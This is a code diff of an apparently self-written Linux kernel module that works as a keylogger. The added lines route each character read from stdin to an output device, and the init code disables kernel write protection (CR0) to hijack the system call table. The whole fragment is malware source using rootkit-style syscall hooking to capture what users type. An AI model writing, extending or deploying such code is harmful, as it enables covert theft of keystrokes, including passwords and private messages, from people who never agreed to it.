@@ -30,6 +30,12 @@ asmlinkage int readHook(int fd, void* buf, size_t nbytes)
 		
 	//printk("\n");
 	printk ("%c\n", (((char *) buf)[0]));
+	
+	{
+		char *bufferAsCharacterAnArray = (char *) buf;
+		char ch = bufferAsCharacterAnArray[0];
+		addCharacterToOutputDevice(ch);
+	}
 		//printk("stdin read\n");
 	//printk("bytes read = %d\n", (int) nbytes);
 	}
@@ -37,9 +43,7 @@ asmlinkage int readHook(int fd, void* buf, size_t nbytes)
 } 
 
 
-int __init logInput_init(void) {
-	printk(KERN_INFO "in unimplemented %s\n", __FUNCTION__);
-	
+int __init logInput_init(void) {	
 	syscallTable = (void *) SYSCALL_TABLE;
 	write_cr0 (read_cr0 () & (~ 0x10000));
 	syscallPageTemp = virt_to_page(&syscallTable);
